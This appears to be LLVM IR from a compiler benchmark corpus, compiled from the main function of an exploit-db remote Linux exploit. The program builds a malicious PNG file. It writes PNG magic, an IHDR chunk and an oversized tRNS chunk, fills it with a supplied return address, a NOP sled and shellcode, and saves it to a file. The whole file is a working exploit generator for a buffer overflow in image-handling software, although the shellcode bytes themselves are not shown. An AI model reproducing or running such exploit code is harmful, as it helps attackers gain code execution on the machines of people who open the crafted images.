; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_389.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_389.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@OUTFILE = common dso_local global i8* null, align 8
@BS = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"Usage: %s < retaddr > [ outfile ]\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [4 x i8] c"%lx\00", align 1
@png_majic = common dso_local global i32* null, align 8
@MAJIC_LEN = common dso_local global i32 0, align 4
@png_ihdr = common dso_local global i32* null, align 8
@IHDR_LEN = common dso_local global i32 0, align 4
@png_trns_len_id = common dso_local global i32* null, align 8
@TRNS_LEN = common dso_local global i32 0, align 4
@RETADDR_BYTES = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@NNOPS = common dso_local global i32 0, align 4
@sc = common dso_local global i32* null, align 8
@SHELL_LEN = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_EXCL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"write\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %15 = load i8*, i8** @OUTFILE, align 8
  store i8* %15, i8** %10, align 8
  %16 = load i32, i32* @BS, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %11, align 8
  %19 = alloca i32, i64 %17, align 16
  store i64 %17, i64* %12, align 8
  store i32 0, i32* %13, align 4
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %29

22:                                               ; preds = %2
  %23 = load i32, i32* @stderr, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @fprintf(i32 %23, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i8* %26)
  %28 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %28, i32* %3, align 4
  store i32 1, i32* %14, align 4
  br label %149

29:                                               ; preds = %2
  %30 = load i32, i32* %4, align 4
  %31 = icmp sgt i32 %30, 2
  br i1 %31, label %32, label %36

32:                                               ; preds = %29
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %10, align 8
  br label %36

36:                                               ; preds = %32, %29
  %37 = load i32, i32* @BS, align 4
  %38 = call i32 @memset(i32* %19, i32 0, i32 %37)
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @sscanf(i8* %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i32* %13)
  %43 = load i32*, i32** @png_majic, align 8
  %44 = load i32, i32* @MAJIC_LEN, align 4
  %45 = call i32 @memcpy(i32* %19, i32* %43, i32 %44)
  %46 = load i32, i32* @MAJIC_LEN, align 4
  %47 = load i32, i32* %7, align 4
  %48 = add nsw i32 %47, %46
  store i32 %48, i32* %7, align 4
  %49 = load i32, i32* %7, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i32, i32* %19, i64 %50
  %52 = load i32*, i32** @png_ihdr, align 8
  %53 = load i32, i32* @IHDR_LEN, align 4
  %54 = call i32 @memcpy(i32* %51, i32* %52, i32 %53)
  %55 = load i32, i32* @IHDR_LEN, align 4
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, %55
  store i32 %57, i32* %7, align 4
  %58 = load i32, i32* %7, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %19, i64 %59
  %61 = load i32*, i32** @png_trns_len_id, align 8
  %62 = load i32, i32* @TRNS_LEN, align 4
  %63 = call i32 @memcpy(i32* %60, i32* %61, i32 %62)
  %64 = load i32, i32* @TRNS_LEN, align 4
  %65 = load i32, i32* %7, align 4
  %66 = add nsw i32 %65, %64
  store i32 %66, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %67

67:                                               ; preds = %83, %36
  %68 = load i32, i32* %8, align 4
  %69 = load i32, i32* @RETADDR_BYTES, align 4
  %70 = sub nsw i32 %69, 3
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %86

72:                                               ; preds = %67
  %73 = load i32, i32* %7, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i32, i32* %19, i64 %74
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i32, i32* %75, i64 %77
  %79 = load i32, i32* @ALIGN, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i32, i32* %78, i64 %80
  %82 = call i32 @memcpy(i32* %81, i32* %13, i32 4)
  br label %83

83:                                               ; preds = %72
  %84 = load i32, i32* %8, align 4
  %85 = add nsw i32 %84, 4
  store i32 %85, i32* %8, align 4
  br label %67

86:                                               ; preds = %67
  %87 = load i32, i32* @ALIGN, align 4
  %88 = load i32, i32* %8, align 4
  %89 = add nsw i32 %88, %87
  store i32 %89, i32* %8, align 4
  %90 = load i32, i32* %8, align 4
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, %90
  store i32 %92, i32* %7, align 4
  %93 = load i32, i32* %7, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %19, i64 %94
  %96 = load i32, i32* @NOP, align 4
  %97 = load i32, i32* @NNOPS, align 4
  %98 = call i32 @memset(i32* %95, i32 %96, i32 %97)
  %99 = load i32, i32* @NNOPS, align 4
  %100 = load i32, i32* %7, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %7, align 4
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %19, i64 %103
  %105 = load i32*, i32** @sc, align 8
  %106 = load i32, i32* @SHELL_LEN, align 4
  %107 = call i32 @memcpy(i32* %104, i32* %105, i32 %106)
  %108 = load i32, i32* @SHELL_LEN, align 4
  %109 = load i32, i32* %7, align 4
  %110 = add nsw i32 %109, %108
  store i32 %110, i32* %7, align 4
  %111 = load i32, i32* %8, align 4
  %112 = load i32, i32* @NNOPS, align 4
  %113 = add nsw i32 %111, %112
  %114 = load i32, i32* @SHELL_LEN, align 4
  %115 = add nsw i32 %113, %114
  store i32 %115, i32* %9, align 4
  %116 = load i32, i32* %9, align 4
  %117 = call i32 @htonl(i32 %116)
  %118 = load i32, i32* @MAJIC_LEN, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i32, i32* %19, i64 %119
  %121 = load i32, i32* @IHDR_LEN, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %117, i32* %123, align 4
  %124 = load i32, i32* %7, align 4
  %125 = sext i32 %124 to i64
  %126 = add i64 %125, 4
  %127 = trunc i64 %126 to i32
  store i32 %127, i32* %7, align 4
  %128 = load i8*, i8** %10, align 8
  %129 = load i32, i32* @O_WRONLY, align 4
  %130 = load i32, i32* @O_CREAT, align 4
  %131 = or i32 %129, %130
  %132 = load i32, i32* @O_EXCL, align 4
  %133 = or i32 %131, %132
  %134 = call i32 @open(i8* %128, i32 %133, i32 438)
  store i32 %134, i32* %6, align 4
  %135 = icmp slt i32 %134, 0
  br i1 %135, label %136, label %138

136:                                              ; preds = %86
  %137 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  br label %138

138:                                              ; preds = %136, %86
  %139 = load i32, i32* %6, align 4
  %140 = load i32, i32* %7, align 4
  %141 = call i32 @write(i32 %139, i32* %19, i32 %140)
  %142 = load i32, i32* %7, align 4
  %143 = icmp ne i32 %141, %142
  br i1 %143, label %144, label %146

144:                                              ; preds = %138
  %145 = call i32 @die(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  br label %146

146:                                              ; preds = %144, %138
  %147 = load i32, i32* %6, align 4
  %148 = call i32 @close(i32 %147)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %14, align 4
  br label %149

149:                                              ; preds = %146, %22
  %150 = load i8*, i8** %11, align 8
  call void @llvm.stackrestore(i8* %150)
  %151 = load i32, i32* %3, align 4
  ret i32 %151
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i32 @memset(i32*, i32, i32) #2

declare dso_local i32 @sscanf(i8*, i8*, i32*) #2

declare dso_local i32 @memcpy(i32*, i32*, i32) #2

declare dso_local i32 @htonl(i32) #2

declare dso_local i32 @open(i8*, i32, i32) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32 @write(i32, i32*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
